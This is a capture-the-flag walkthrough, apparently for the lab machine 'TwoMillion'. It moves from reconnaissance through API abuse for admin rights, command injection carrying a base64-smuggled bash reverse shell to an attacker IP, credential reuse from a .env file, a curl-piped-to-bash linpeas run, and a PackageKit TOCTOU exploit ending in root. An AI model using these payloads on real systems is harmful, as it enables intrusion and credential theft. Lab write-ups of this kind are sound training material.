## 1. Reconnaissance

We start with an Nmap scan to identify open ports and exposed services.

```bash
nmap -A twomillion.htb
```

```
Starting Nmap 7.98 ( https://nmap.org )
Nmap scan report for twomillion.htb (10.129.106.223)
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain?
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Results:**

- Port **22**: SSH (OpenSSH 8.9p1)
- Port **53**: DNS
- Port **80**: HTTP via nginx → redirects to `http://2million.htb/`

We add the domain to `/etc/hosts`:

```bash
echo "10.129.106.223 2million.htb" >> /etc/hosts
```

---

<a id="sec-2"></a>

## 2. Enumeration

### 2.1 Website Analysis

While exploring the site, we identify that the page uses **jQuery version 2.2.0**, which is vulnerable to a **DOM XSS** injection (CVE-2020-11023). This vulnerability allows arbitrary JavaScript to be injected and executed via jQuery methods such as `.html()`, `.append()`, etc.

We confirm the jQuery version in the browser console:

```js
$.fn.jquery
// "2.2.0"
```

### 2.2 Generating the Invite Code

The site requires an invite code to create an account. We exploit the API to generate one.

**Step 1 - Get the generation instructions:**

```js
fetch('/api/v1/invite/how/to/generate', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'}
}).then(r => r.json()).then(data => console.log(data))
```

The response contains a message encoded in **ROT13**. Once decoded:

> _"In order to generate the invite code, make a POST request to /api/v1/invite/generate"_

**Step 2 - Generate the code:**

```js
fetch('/api/v1/invite/generate', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'}
}).then(r => r.json()).then(data => {
  console.log(data)
  console.log("Decoded code:", atob(data.data.code))
})
```

The returned code is Base64-encoded. After decoding:

```
OJQZG-WN8IT-RLADL-3OH9P
```

We use this code to create an account on the site.

### 2.3 Privilege Escalation via the API

Once logged in, we explore the available endpoints:

```js
let endpoints = ['/api/v1/user/auth', '/api/v1/admin', '/api/v1/invite', '/api/v1/admin/vpn/generate']

endpoints.forEach(ep => {
    fetch(ep, {credentials: 'include'})
      .then(r => console.log(ep, r.status))
})
```

We discover the `/api/v1/admin/settings/update` endpoint, which allows modifying a user's permissions. We exploit it to grant ourselves admin rights:

```js
fetch('/api/v1/admin/settings/update', {
  method: 'PUT',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    "email": "lexor@htb.com",
    "is_admin": 1
  })
}).then(r => r.text()).then(data => console.log(data))
```

**Response:**

```json
{"id": 13, "username": "L3X0R", "is_admin": 1}
```

We verify our new status:

```js
fetch('/api/v1/user/auth', {credentials: 'include'})
  .then(r => r.json())
  .then(data => console.log(data))

// {"loggedin": true, "username": "L3X0R", "is_admin": 1}
```

---

<a id="sec-3"></a>

## 3. Exploitation - Initial Access

### 3.1 OS Command Injection

While testing the `/api/v1/admin/vpn/generate` endpoint, we discover an **OS command injection** via the `username` parameter. User input is passed directly to a shell without sanitization.

**Proof of concept:**

```js
fetch('/api/v1/admin/vpn/generate', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({"username": "test;id;"})
}).then(r => r.text()).then(data => console.log(data))
```

**Response:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The injection works - we're executing as `www-data`.

### 3.2 Reverse Shell

We set up a listener on our attacking machine:

```bash
nc -lvnp 4444
```

We Base64-encode the payload to avoid issues with special characters:

```js
let cmd = btoa("bash -i >& /dev/tcp/10.10.14.227/4444 0>&1")

fetch('/api/v1/admin/vpn/generate', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({"username": `test;echo ${cmd}|base64 -d|bash;`})
}).then(r => r.text()).then(data => console.log(data))
```

**Shell obtained:**

```
www-data@2million:~/html$
```

---

<a id="sec-4"></a>

## 4. Foothold - www-data Shell

Once we have the shell, we improve its interactivity:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

We search the web directory and discover a `.env` file containing plaintext credentials:

```bash
cat /var/www/html/.env
```

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

---

<a id="sec-5"></a>

## 5. Lateral Movement - User Flag

We try reusing the database password to log in via SSH as the `admin` user (password reuse):

```bash
ssh admin@2million.htb
# Password: SuperDuperPass123
```

Login successful! We retrieve the **user flag**:

```bash
cat ~/user.txt
a30b2e30590fa4dc85ed6c6dcb47e457
```

---

<a id="sec-6"></a>

## 6. Privilege Escalation - Root Flag

### 6.1 Enumeration with LinPEAS

We transfer and run **LinPEAS** to identify privilege escalation vectors:

```bash
# On the attacking machine
python3 -m http.server 8000

# On the target machine
curl http://10.10.14.227:8000/linpeas.sh | bash
```

LinPEAS identifies a critical vulnerability:

```
══════════╣ Checking for PackageKit Pack2TheRoot (CVE-2026-41651)
PackageKit version detected: 1.2.5-2ubuntu2
Vulnerable to CVE-2026-41651 (Pack2TheRoot)
Fixed version: 1.2.5-2ubuntu3.1
```

### 6.2 Exploiting CVE-2026-41651 (Pack2TheRoot)

**CVE-2026-41651** is a **TOCTOU (Time-Of-Check Time-Of-Use)** vulnerability in PackageKit. It allows an unprivileged user to drop a root SUID binary onto the system by manipulating a PackageKit transaction between the simulation phase and the actual installation phase.

We download and run the PoC:

```bash
cd /tmp
curl http://10.10.14.227:8000/CVE-2026-41651.py -o CVE-2026-41651.py
python3 /tmp/CVE-2026-41651.py
```

```
[+] SUID drop directory: /var/tmp  (no nosuid/noexec)
[+] Package format: DEB
[*] Building test packages...
[+] Dummy pkg:   /tmp/pk-dummy-65145.deb
[+] Payload pkg: /tmp/pk-payload-65145.deb
[+] Payload installs SUID bash to: /var/tmp/.suid_bash
[*] Firing TOCTOU race (SIMULATE → REAL on same transaction)...
[+] Confirmed: /var/tmp/.suid_bash is SUID root (mode=0o104755)
[+] Dropping to root shell via SUID bash (-p preserves effective UID=0)
```

We get a root shell. We retrieve the **root flag**:

```bash
cat /root/root.txt
dc5553f3e7c8c9585d24793ada620164
```
